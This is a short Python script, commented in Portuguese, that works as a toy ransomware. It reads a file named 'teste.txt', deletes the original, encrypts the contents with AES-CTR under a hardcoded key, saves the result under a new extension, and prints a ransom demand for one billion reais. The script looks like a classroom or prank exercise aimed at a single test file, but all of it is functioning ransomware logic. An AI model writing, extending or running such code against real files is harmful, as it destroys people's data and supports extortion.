import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()


## remover o arquivo
os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)


## salvar o arquivo criptografado
new_file = file_name + ".ransowaretrollNaldo"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()

print("Seu arquivo foi criptografado. Será necessário me pagar R$ 1.000.000.000,00 para reaver o arquivo.")
